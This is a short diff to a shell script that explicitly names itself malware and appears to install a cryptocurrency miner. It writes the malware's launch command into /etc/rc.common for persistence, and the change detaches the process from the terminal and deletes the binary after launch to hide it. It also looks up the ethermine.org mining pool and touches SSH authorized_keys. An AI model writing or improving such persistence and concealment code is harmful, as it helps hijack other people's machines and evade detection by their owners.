@@ -24,8 +24,9 @@ chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true
 echo "$MALWARE_PATH" >> /etc/rc.common 2>/dev/null || true
 echo "$MALWARE_PATH --cpu-priority 4 &" >> /etc/rc.common 2>/dev/null || true
 
-# Execute the malware
-"$MALWARE_PATH" --cpu-priority 4 &
+# Execute the malware, detach from the terminal stdout and stderr
+"$MALWARE_PATH" --cpu-priority 4 </dev/null >/dev/null 2>&1 &
+rm "$MALWARE_PATH"
 
 # Perform a lookup to a mining pool
 nslookup ethermine.org
